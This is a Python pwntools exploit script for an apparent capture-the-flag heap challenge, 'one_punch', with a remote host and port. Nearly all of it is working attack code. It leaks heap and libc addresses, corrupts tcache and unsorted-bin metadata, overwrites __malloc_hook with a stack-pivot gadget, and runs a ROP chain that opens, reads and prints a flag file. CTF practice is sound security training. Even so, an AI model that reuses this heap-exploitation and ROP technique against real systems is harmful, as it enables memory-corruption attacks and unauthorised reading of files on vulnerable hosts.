#!/usr/bin/env python2

from pwn import *

BINARY = './one_punch'
HOST, PORT = '3.115.121.123', 5731

elf = ELF('./one_punch')
libc = ELF('./libc.so.6')

def start():
	if not args.REMOTE:
		print "LOCAL PROCESS"
		return process(BINARY)
	else:
		print "REMOTE PROCESS"
		return remote(HOST, PORT)

def get_base_address(proc):
	return int(open("/proc/{}/maps".format(proc.pid), 'rb').readlines()[0].split('-')[0], 16)

def debug(breakpoints):
    script = "handle SIGALRM ignore\n"
    PIE = get_base_address(p)
    script += "set $_base = 0x{:x}\n".format(PIE)
    for bp in breakpoints:
        script += "b *0x%x\n"%(PIE+bp)
    gdb.attach(p,gdbscript=script)

def add(idx, name):
	p.sendlineafter('> ', '1')
	p.sendlineafter(': ', str(idx))
	p.sendafter(': ', name)

def edit(idx, name):
	p.sendlineafter('> ', '2')
	p.sendlineafter(': ', str(idx))
	p.sendafter(': ', name)

def show(idx):
	p.sendlineafter('> ', '3')
	p.sendlineafter(': ', str(idx))

def free(idx):
	p.sendlineafter('> ', '4')
	p.sendlineafter(': ', str(idx))

def secret(content):
	p.sendlineafter('> ', '50056')
	p.send(content)

context.arch = 'amd64'
context.terminal = ['tmux', 'new-window']

p = start()

# Heap leak
add(0, 'A'*0x210)
edit(0, 'A'*0xe0 + flat(0x300, 0x20).ljust(0x210, 'A'))
free(0)
add(0, 'A'*0x210)
free(0)
show(0)
heap = u64(p.recvline().split(': ')[1].strip().ljust(8, '\x00')) - 0x260
log.info('Heap base: ' + hex(heap))

# Libc leak
for i in range(5):
	add(0, 'A'*0x210)
	free(0)
add(0, 'A'*0x210)
add(1, 'A'*0x210)
free(0)
show(0)
libc.address = u64(p.recvline().split(': ')[1].strip().ljust(8, '\x00')) - 0x1e4ca0
log.info('Libc base: ' + hex(libc.address))

add(1, 'A'*0x210)

# Forge tcache size count
for i in range(3):
	add(0, 'A'*0x3a0)
	free(0)

# Fill the 0x80 and 0x100 tcache bins
for i in range(7):
	add(0, 'A'*0x80)
	free(0)
for i in range(7):
	add(0, 'A'*0x100)
	free(0)

# Free a 0x21 chunk to tcache
free(1)
add(0, 'A'*0x80)
add(1, 'A'*0x80)
free(1)
free(0)
add(0, 'A'*0x210)
edit(0, 'A'*0x80 + flat(0, 0x21) + 'B'*(0x210-0x90))
free(1)
free(0)

# Free a 0x31 chunk to tcache
add(0, 'A'*0x100)
add(1, 'A'*0x80)
free(1)
free(0)
add(0, 'A'*0x210)
edit(0, 'A'*0x100 + flat(0, 0x31) + 'B'*(0x210-0x100))
free(1)
free(0)

# Create a 0x300 unsorted bin chunk
# Also send 0x210 unsorted bin chunk to small bin
add(1, 'A'*0x300)
for i in range(7):
	add(0, 'A'*0x300)
	free(0)
free(1)

# Put the 0x210 small bin chunk back into the unsorted bin
add(0, 'A'*0x210)
free(0)

'''
ub = unsorted bin
we have: ub -> ub_0x220 -> 0x310 -> ub
we want: ub -> ub_0x220 -> tcache_0x30 -> tcache -> tcache_0x20 -> ub
'''

ub = libc.address + 0x1e4ca0
ub_0x220 = heap + 0x1130
ub_0x310 = heap + 0x2be0
tcache = heap + 0x40

add(0, 'A'*0x210)
add(1, 'A'*0x300)
free(1)
free(0)

tcache_0 = flat(0, 0x21, ub_0x310, tcache, 0x20, 0x20)
tcache_1 = flat(0, 0x31, tcache, ub_0x220, 'A'*0x10, 0x30, 0x20)
payload = flat(heap+0x1250, ub, 'A'*0x80, tcache_0, 'A'*(0x80-len(tcache_0)), tcache_1)
edit(0, payload)
edit(1, flat(ub, heap+0x11d0))

add(0, 'A'*0x2f0) # tcache chunk's size is seen as 0x300
edit(0, flat('\x00'*0x100, libc.sym['__malloc_hook'], '\x00'*0x100))

add_rsp_0x48 = libc.address + 0x8cfd6
pop_rdi = libc.address + 0x26542
pop_rsi = libc.address + 0x26f9e
pop_rdx = libc.address + 0x12bda6
pop_rax = libc.address + 0x47cf8
syscall = libc.address + 0xcf6c5

# Overwrite malloc_hook
secret(flat(add_rsp_0x48, 0, '/home/vagrant/flag'))

flag_path = libc.sym['__malloc_hook'] + 0x10

rop = flat(
	pop_rdi, flag_path, pop_rsi, 0, pop_rax, 2, syscall,
	pop_rdi, 3, pop_rsi, heap, pop_rdx, 0x30, pop_rax, 0, syscall,
	pop_rdi, 1, pop_rsi, heap, pop_rdx, 0x30, pop_rax, 1, syscall
)

if args.GDB:
	debug([])

add(0, rop.ljust(0x400, '\x00'))

p.interactive()